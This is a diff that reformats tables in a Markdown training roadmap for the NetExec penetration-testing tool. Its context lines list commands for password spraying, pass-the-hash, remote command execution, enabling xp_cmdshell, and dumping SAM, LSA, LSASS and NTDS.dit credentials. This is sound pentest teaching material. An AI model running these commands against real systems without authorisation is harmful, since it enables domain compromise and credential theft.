@@ -21,17 +21,17 @@
 > [[Cyber-Security/Roadmap/README|🏠 Master Roadmap]] · [[Cyber-Security/Roadmap/Tools/README|🔧 Tools Index]]
 
 | AD Recon & Enumeration | Credential Capture & Abuse | Lateral Movement | Privilege Escalation |
-|:-----------------------|:---------------------------|:-----------------|:---------------------|
+| :----------------------- | :--------------------------- | :----------------- | :--------------------- |
 | [[BloodHound\|🩸 BloodHound]] | [[Responder\|📡 Responder]] | **🌐 NetExec** (you are here) | [[Mimikatz\|🐱 Mimikatz]] |
 | [[Kerbrute\|🔑 Kerbrute]] | [[Impacket\|🐍 Impacket]] | [[Evil-WinRM\|🪟 Evil-WinRM]] | [[Rubeus\|🎫 Rubeus]] |
-| [[Certipy\|🎫 Certipy]] | | [[Chisel\|🔀 Chisel]] | [[LinPEAS\|🐉 LinPEAS]] |
+| [[Certipy\|🎫 Certipy]] || [[Chisel\|🔀 Chisel]] | [[LinPEAS\|🐉 LinPEAS]] |
 
 ---
 
 ## 📊 Progress Overview
 
 | Phase | Focus | Tasks | Est. Time |
-|:---:|:---|:---:|:---:|
+| :---: | :--- | :---: | :---: |
 | 1 | Fundamentals | 5 | 2–3 hours |
 | 2 | SMB Protocol | 5 | 3–4 hours |
 | 3 | Credential Attacks | 4 | 2–3 hours |
@@ -40,7 +40,7 @@
 | 6 | Modules | 3 | 2–3 hours |
 | 7 | Practical Labs | 4 | 4–6 hours |
 | 8 | Mastery Challenges | 3 | 3–5 hours |
-| | **Total** | **33** | **~21–32 hours** |
+|| **Total** | **33** | **~21–32 hours** |
 
 **Prerequisites:** Active Directory concepts (users, groups, GPOs, Kerberos, NTLM). Understanding of SMB and authentication protocols. Familiarity with Pass-the-Hash and credential types (cleartext, NTLM hash, Kerberos ticket).
 
@@ -55,7 +55,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **History** | CrackMapExec (CME) was the original tool. Effectively abandoned by its main dev. NetExec is the direct successor — same codebase, same syntax, actively maintained. |
 | **Commands** | CME: `crackmapexec smb`. NetExec: `nxc smb`. Commands are identical except the binary name. |
 | **Go Forward** | Always use `nxc` (NetExec). CME still works but lags behind in features and bug fixes. |
@@ -67,7 +67,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Kali** | `apt install netexec`. Or: `pipx install netexec`. |
 | **Verify** | `nxc --version`. |
 | **Update** | `pipx upgrade netexec`. |
@@ -79,7 +79,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Format** | `nxc <protocol> <target> -u <user> -p <password> [options]`. |
 | **Protocols** | `smb`, `winrm`, `ldap`, `mssql`, `ssh`, `rdp`, `vnc`, `ftp`. |
 | **Target** | Single IP: `192.168.1.10`. Range: `192.168.1.0/24`. List: `-t targets.txt`. Multiple: `192.168.1.1 192.168.1.2`. |
@@ -92,7 +92,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Cleartext** | `-u admin -p Password123`. |
 | **NTLM Hash (PtH)** | `-u admin -H <NT_hash>` — Pass-the-Hash, no password needed. |
 | **Kerberos** | `-k` — use Kerberos (requires valid TGT in ccache). |
@@ -107,7 +107,7 @@
 - [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Save Output** | `nxc smb ... 2>&1 | tee scan.txt`. |
 | **Database** | NetExec stores results in `~/.nxc/logs/` and a SQLite database. `nxc smb ... --log scan.log`. |
 | **Export** | `nxc smb 192.168.1.0/24 -u admin -p pass --export $(pwd)/results.txt`. |
@@ -123,7 +123,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Discover Hosts** | `nxc smb 192.168.1.0/24` — discovers all SMB hosts on the network. Shows hostname, OS, domain, SMB signing status. |
 | **SMB Signing** | Column "signing" — `False` means SMB signing not required → relay attack possible. `nxc smb 192.168.1.0/24 --gen-relay-list targets.txt` — generates a list of unsigned targets for ntlmrelayx. |
 | **Key Info** | Hostname, OS version (Windows Server 2019, etc.), domain membership — all from unauthenticated SMB. |
@@ -135,7 +135,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **List Shares** | `nxc smb 192.168.1.0/24 -u user -p pass --shares`. Shows all accessible shares on all machines in the range. |
 | **Interesting** | `SYSVOL` and `NETLOGON` (domain scripts — may contain credentials). `C$` and `ADMIN$` (admin shares — only accessible to admins). Custom shares (department data). |
 | **Null Session** | `nxc smb target -u '' -p '' --shares` — check for anonymous share access. |
@@ -147,7 +147,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Domain Users** | `nxc smb DC_IP -u user -p pass --users`. |
 | **Local Users** | `nxc smb target -u user -p pass --local-users`. |
 | **Groups** | `nxc smb DC_IP -u user -p pass --groups`. |
@@ -161,7 +161,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Execute** | `nxc smb target -u admin -p pass -x "whoami"` — run cmd command. `-X "whoami"` — run PowerShell command. |
 | **Exec Method** | `--exec-method wmiexec` — use WMI (default). `--exec-method smbexec` — use SMB service. `--exec-method atexec` — use task scheduler. |
 | **Mass Execution** | `nxc smb 192.168.1.0/24 -u admin -p pass -x "ipconfig"` — run on all machines where credential works. |
@@ -173,7 +173,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Grep Pwned** | `nxc smb 192.168.1.0/24 -u admin -p pass | grep Pwn3d!` — show only machines where you have admin. |
 | **Success Only** | `nxc smb ... | grep "\\[\\+\\]"` — show only successful authentication. |
 
@@ -188,7 +188,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Concept** | Try one password against many users. Avoids account lockout (vs. brute force which tries many passwords against one user). |
 | **Command** | `nxc smb DC_IP -u users.txt -p "Winter2024!" --continue-on-success`. |
 | **Lockout Warning** | Always check `--pass-pol` first. If lockout threshold is 5 attempts, try ≤3 passwords before waiting for reset. |
@@ -201,7 +201,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Command** | `nxc smb 192.168.1.0/24 -u administrator -H <NT_hash> --local-auth`. |
 | **Find Local Admin** | `nxc smb 192.168.1.0/24 -u administrator -H <hash> --local-auth | grep Pwn3d!` — find all machines where the local admin hash works. |
 | **Domain Admin PtH** | `nxc smb 192.168.1.0/24 -u DA_user -H <DA_NT_hash> -d DOMAIN | grep Pwn3d!` — test domain admin hash across the network. |
@@ -213,7 +213,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Kerberoast** | `nxc ldap DC_IP -u user -p pass --kerberoasting kerberoast.txt` — enumerate and request TGS tickets for service accounts. Crack with Hashcat mode 13100. |
 | **ASREPRoast** | `nxc ldap DC_IP -u user -p pass --asreproast asrep.txt` — find and request AS-REP for users without pre-auth required. Crack with Hashcat mode 18200. |
 
@@ -224,7 +224,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **WinRM** | `nxc winrm 192.168.1.0/24 -u admin -p pass` — test WinRM access. `(Pwn3d!)` means you can use evil-winrm. |
 | **MSSQL** | `nxc mssql 192.168.1.0/24 -u sa -p pass` — test MSSQL credentials. |
 | **SSH** | `nxc ssh 192.168.1.0/24 -u user -p pass` — test SSH credentials. |
@@ -240,7 +240,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Command** | `nxc smb target -u admin -p pass --sam`. |
 | **What It Gets** | All local user account NT hashes from the SAM registry hive. |
 | **Use** | Crack hashes or use for local admin PtH to other machines (credential re-use). |
@@ -252,7 +252,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Command** | `nxc smb target -u admin -p pass --lsa`. |
 | **What It Gets** | LSA (Local Security Authority) secrets: service account credentials stored on the machine, auto-login passwords, cached domain credentials. |
 | **High Value** | Service accounts often have elevated privileges. Auto-login password = cleartext credential. |
@@ -264,7 +264,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Command** | `nxc smb DC_IP -u DA_user -p DA_pass --ntds`. |
 | **What It Gets** | Complete NTDS.dit dump — NT hashes for ALL domain accounts. |
 | **Impact** | All domain credentials. Crack offline or use for PtH/silver/golden ticket attacks. |
@@ -277,7 +277,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Command** | `nxc ldap DC_IP -u user -p pass --bloodhound --collection All`. |
 | **What It Does** | Runs BloodHound data collection remotely via LDAP without needing to run SharpHound on the target. |
 | **Output** | Creates BloodHound-compatible JSON files. Import into BloodHound for attack path visualization. |
@@ -289,7 +289,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **List** | `nxc smb target -u admin -p pass -M spider_plus -o READ_ONLY=false` — spider shares and list all files. |
 | **Download** | `nxc smb target -u admin -p pass --get-file \\target_path\\file.txt /local/path/`. |
 | **Upload** | `nxc smb target -u admin -p pass --put-file /local/file.exe \\target_path\\`. |
@@ -305,7 +305,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Users** | `nxc ldap DC_IP -u user -p pass --users`. |
 | **Computers** | `nxc ldap DC_IP -u user -p pass --computers`. |
 | **Trusted for Delegation** | `nxc ldap DC_IP -u user -p pass --trusted-for-delegation` — find accounts with unconstrained delegation. |
@@ -318,7 +318,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Test** | `nxc winrm target -u user -p pass`. |
 | **Shell** | If `(Pwn3d!)`: `evil-winrm -i target -u user -p pass`. Or with hash: `evil-winrm -i target -u user -H hash`. |
 | **Port** | WinRM: port 5985 (HTTP) or 5986 (HTTPS). |
@@ -330,7 +330,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Test** | `nxc mssql target -u sa -p pass`. |
 | **Execute OS** | `nxc mssql target -u sa -p pass -x "whoami"` — via xp_cmdshell. |
 | **Enable xp_cmdshell** | `nxc mssql target -u sa -p pass -q "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"`. |
@@ -343,7 +343,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Test** | `nxc rdp 192.168.1.0/24 -u user -p pass` — check RDP access. |
 | **Screenshot** | `nxc rdp target -u user -p pass --screenshot` — screenshot the desktop. |
 | **Nla** | `nxc rdp target -u user -p pass --nla-screenshot` — with NLA. |
@@ -359,7 +359,7 @@
 - [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **List Modules** | `nxc smb -L` — list all available SMB modules. |
 | **Module Info** | `nxc smb -M module_name --options` — see module options. |
 | **Run Module** | `nxc smb target -u user -p pass -M module_name -o OPTION=value`. |
@@ -371,7 +371,7 @@
 - [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **spider_plus** | Spider all accessible shares and index files. `nxc smb target -u user -p pass -M spider_plus`. |
 | **lsassy** | Dump LSASS memory via various methods. `nxc smb target -u admin -p pass -M lsassy`. |
 | **mimikatz** | Run Mimikatz remotely (noisy — likely flagged by AV). |
@@ -385,7 +385,7 @@
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min
 
 | Field | Detail |
-|:---|:---|
+| :--- | :--- |
 | **Workflow** | 1. `nxc smb 192.168.1.0/24` — discover hosts, note signing status. 2. `nxc smb DC_IP -u user -p pass --users` — enumerate users. 3. `nxc smb DC_IP -u user -p pass --pass-pol` — check lockout. 4. `nxc smb 192.168.1.0/24 -u user -p pass --shares` — find shares. 5. `nxc smb 192.168.1.0/24 -u user -p pass | grep Pwn3d!` — find admin access. 6. `nxc smb DC_IP -u DA_user -p DA_pass --ntds` — dump all hashes. |
 
 ---
@@ -464,7 +464,7 @@
 # 📋 FINAL COMPETENCY MATRIX
 
 | Competency | Self-Assessment |
-|:---|:---:|
+| :--- | :---: |
 | Can discover hosts and enumerate SMB info without credentials | ☐ |
 | Can validate credentials across a network range | ☐ |
 | Can identify machines where credentials provide admin access | ☐ |
